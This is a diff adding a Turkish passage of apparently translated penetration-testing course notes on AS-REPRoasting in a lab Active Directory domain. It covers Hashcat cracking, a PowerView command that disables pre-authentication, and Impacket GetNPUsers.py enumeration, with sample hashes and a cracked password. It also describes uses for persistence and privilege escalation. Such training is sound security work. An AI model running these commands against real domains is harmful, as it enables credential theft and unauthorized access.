@@ -363,3 +363,181 @@ PS C:\Tools> .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.loc
 
 
 ### Hash Cracking
+
+Araç, çeşitli **TGT**’lere bağlı **hash** listesini döndürür. Geriye kalan tek şey, **Hashcat** kullanarak bu farklı hesaplara ait **clear text password**’ü elde etmeye çalışmaktır. **Hashcat** için **hash-mode** değeri **18200**’dür (**Kerberos 5, etype 23, AS-REP**).
+
+```
+C:\Tools\hashcat-6.2.6> hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O
+
+hashcat (v6.2.6) starting
+OpenCL API (OpenCL 2.1 WINDOWS) - Platform #1 [Intel(R) Corporation]
+====================================================================
+* Device #1: AMD EPYC 7401P 24-Core Processor, 2015/4094 MB (511 MB
+allocatable), 4MCU
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13
+rotates
+Rules: 1
+Optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+Host memory required for this attack: 0 MB
+Dictionary cache hit:
+* Filename..: C:\Tools\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+[email protected]:c4caff1049fd667...9b96189d8804:dancing_queen101
+<SNIP>
+
+```
+
+
+Görüldüğü gibi, **Hashcat** iki **ASREPRoastable** kullanıcıdan birinin **password**’ünü başarıyla kırdı. Gerçek bir senaryoda, bu kullanıcının hesabının **domain** içinde bize **initial foothold** sağlayıp sağlamayacağını, **lateral movement** için kullanılabilir olup olmadığını veya **privilege escalation** için yardımcı olup olamayacağını araştırabiliriz.
+
+
+### PowerView ile DONT_REQ_PREAUTH ayarlama
+
+Bir hesap üzerinde **`GenericAll`** ayrıcalıklarına sahip olduğumuzu fark edersek, hesap şifresini sıfırlamak yerine **`DONT_REQ_PREAUTH`** bayrağını etkinleştirerek bu hesap için **hash** isteği gönderebilir ve kırmayı deneyebiliriz. Bunu yapmak için **PowerView** modülünü kullanabiliriz (victim hesabının gerçek kullanıcı adıyla "userName" yerine geçirdiğinizden emin olun):
+
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
+
+VERBOSE: search base:
+LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: Get-DomainObject filter string: (&(|(|
+(samAccountName=userName)(name=userName)(displayname=userName))))
+VERBOSE: XORing 'useraccountcontrol' with '4194304' for
+object 'userName
+```
+
+Bu saldırıyı bir Windows hostundan nasıl gerçekleştireceğimizi gördük, şimdi bir Linux makinesinden AS-REPRoasting saldırısı gerçekleştirmeyi ele alacağız.
+
+
+### AS-REPRoasting from Linux
+
+Impacket'in [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) **script**'i, UAC değeri DONT_REQ_PREAUTH olarak ayarlanmış kullanıcıları listelemek için kullanılabilir.
+
+Not: Linux üzerinde Kerberos ile çalışırken, hedefin DNS sunucusunu kullanmamız veya hedeflediğimiz **domain** için ilgili DNS girişleriyle **host**'umuzu yapılandırmamız gerekir. Yani, saldırıya geçmeden önce /etc/hosts dosyasında **domain**/**Domain Controller** için bir giriş yapmamız gerekir.
+
+
+### AS-REPRoastable Users Enumeration
+
+```
+GetNPUsers.py inlanefreight.local/pixis
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
+Corporation
+Name MemberOf
+PasswordLastSet LastLogon UAC
+----------- --------------------------------------------------- --------
+------------------ -------------------------- --------
+amber.smith 2020-07-
+27 21:35:52.333183 2020-07-28 20:34:15.215302 0x410220
+jenna.smith CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-
+27 21:35:57.901421 <never> 0x410220
+
+```
+
+Şimdi, savunmasız hesapların bir listesini elde ettiğimize göre, komutumuza `-request` parametresini ekleyerek bu hesapların hash'lerini Hashcat formatında talep edebiliriz.
+
+
+### Requesting AS-REPRoastable Hashes
+
+```
+GetNPUsers.py inlanefreight.local/pixis -request
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
+Corporation
+Name MemberOf
+PasswordLastSet LastLogon UAC
+----------- --------------------------------------------------- --------
+------------------ -------------------------- --------
+amber.smith 2020-07-
+27 21:35:52.333183 2020-07-28 20:34:15.215302 0x410220
+jenna.smith CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-
+27 21:35:57.901421 2020-08-12 16:20:21.383297 0x410220
+[email
+protected]:d28eecddc8c5e18157b3d73ec4a68aa5$2a881995d52a313d265<SNIP>
+[email protected]:e65a2fa83383a0c1f189408c07fe6d32$5b0478cd94258778478
+```
+
+
+### Kimlik Doğrulaması Yapmadan Savunmasız Hesapları Bulmak
+
+Eğer domain üzerinde kimlik doğrulama bilgilerimiz yoksa ama bir kullanıcı listemiz varsa, yine de ön doğrulama gerektirmeyen hesapları bulabiliriz. GetNPUsers.py kullanarak, her bir hesabı içeren dosyada arama yapabiliriz ve bu saldırıya karşı savunmasız olan en az bir hesabı tespit edebiliriz:
+
+```
+GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in
+Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in
+Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in
+Kerberos database)
+```
+
+Bir hata alabiliriz, ancak yine de hesabın hash'ini almış oluruz:
+
+### User Hash
+
+```
+cat /tmp/hashes.txt
+
+$krb5asrep$23$amber.smith@INLANEFREIGHT:d28eecddc8c5e18157b3d73ec4a68aa5$2
+a881995d52a313d265<SNIP>
+
+```
+
+
+### Cracking Hashes from Linux
+
+```
+hashcat -m 18200 hashes.txt rockyou.txt
+hashcat (v5.1.0) starting...
+<SNIP>
+[email protected]:c4caff1049fd667<SNIP>9b96189d8804:dancing_queen101
+<SNIP>
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: Kerberos 5 AS-REP etype 23
+Hash.Target......: hashes.txt
+Time.Started.....: Wed Aug 12 16:37:48 2020 (18 secs)
+Time.Estimated...: Wed Aug 12 16:38:06 2020 (0 secs)
+Guess.Base.......: File (Tools/Cracking/Wordlists/Passwords/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 827.0 kH/s (13.72ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
+Progress.........: 28688770/28688770 (100.00%)
+Rejected.........: 0/28688770 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: $HEX[2321686f74746965] ->
+$HEX[042a0337c2a156616d6f732103]
+```
+
+
+Şifreyi başarıyla kırdık.
+
+
+### Red Team Usage
+
+Red Team'ler, AS-REPRoasting'i iki saldırı zincirinin parçası olarak kullanabilir:
+
+**`Persistence`:** Bu biti (yani, DONT_REQ_PREAUTH bayrağını) hesaplar üzerinde ayarlamak, saldırganların şifre değişikliği durumunda hesaplara yeniden erişim kazanmalarını sağlar. Bu, ekibin izleme kapsamı dışında olma olasılığı yüksek olan makinelerde (örneğin, Printer gibi) kalıcı erişim sağlamak için yararlıdır ve bu makinelerde herhangi bir zamanda domain'e erişim sağlama olasılığını artırır. Bu ayar, eski yönetim uygulamaları tarafından kullanılan servis hesaplarında etkinleştirilmiş olabilir ve keşfedildiğinde, mavi takım bu hesapları göz ardı edebilir.
+
+**`Privilege Escalation`:** Bir saldırganın, bir kullanıcının şifresini bilmeden ya da sıfırlamadan, bir hesabın herhangi bir özelliğini değiştirme yetkisi olduğu birçok senaryo vardır. Şifre sıfırlamaları tehlikelidir çünkü alarm çalma olasılıkları yüksektir. Şifreyi sıfırlamak yerine, saldırganlar bu biti etkinleştirip, hesabın şifresini çözmeyi deneyebilir.
+
+AS-REPRoasting, Pre-authentication devre dışı bırakılmış hesapların şifrelerini bulmak ve çözmek için güçlü bir tekniktir. Bu ayar yaygın değildir, ancak zaman zaman karşılaşabiliriz ve başarısı, bir hesabın şifresinin kriptografik olarak zayıf olması ve makul bir süre içinde çözülebilmesiyle (örneğin, Hashcat gibi bir araçla) doğru orantılıdır.
+
+
+### Kerberoasting
+
